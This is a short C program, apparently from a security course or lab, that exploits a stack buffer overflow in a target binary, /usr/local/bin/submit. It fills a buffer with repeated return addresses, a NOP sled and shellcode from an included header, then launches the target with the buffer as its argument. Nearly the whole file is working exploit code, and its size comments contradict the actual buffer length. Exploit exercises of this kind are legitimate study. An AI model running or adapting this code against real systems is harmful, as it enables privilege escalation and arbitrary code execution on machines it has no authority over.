#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include "shellcode.h"
#define TARGET "/usr/local/bin/submit"
#define DEFAULT_BUFFER_SIZE            641  //3072 + 8(EIPESP) + 1(\0)
#define NOP                            0x90

//based on the buffer-overflow for the Copy_function
int main(int argc, char *argv[]) {
	char *buf, *cur, *args[4], *env[1];
	long SC_addr,*addr_ptr;
	int i;
	const int buf_size = DEFAULT_BUFFER_SIZE;
	const int shell_index = 641 - strlen(shellcode) - 1;

	buf = malloc(buf_size);
	SC_addr = 0x9cffbfde; 	// becasue the file I create fill up with NOP, so any address in the front would be work
	cur = buf;
	addr_ptr = (long *) cur;	
	for(i = 0; i < buf_size; i+=4)  // fill up with address first
 		*(addr_ptr++) = (long) SC_addr;
	for(i = 0; i < 272; i++)		//fill up NOP at top
		buf[i]= NOP;
	for(i = 292; i < shell_index; i++)
		buf[i] = NOP;
	cur = buf + shell_index;
	for(i = 0; i < strlen(shellcode); i++)	// cpy shellcode into file
		*(cur++) = shellcode[i];
	buf[buf_size - 1] = '\0';				// at this time file = NOP*3021 + shellcode(55) + addr(4) + '\0'(1)
	
	//fp = fopen("file.txt", "w+"); 
	//fprintf(fp, "%s", buf);		// the file would overflow and replace the EIP(0xffbfda1a)
	//fclose(fp);
	args[0] = buf;
	args[1] = NULL;
  	args[2] = NULL;
 	args[3] = NULL;
  	env[0] = NULL;
  	return execve(TARGET, args, env) < 0;
}

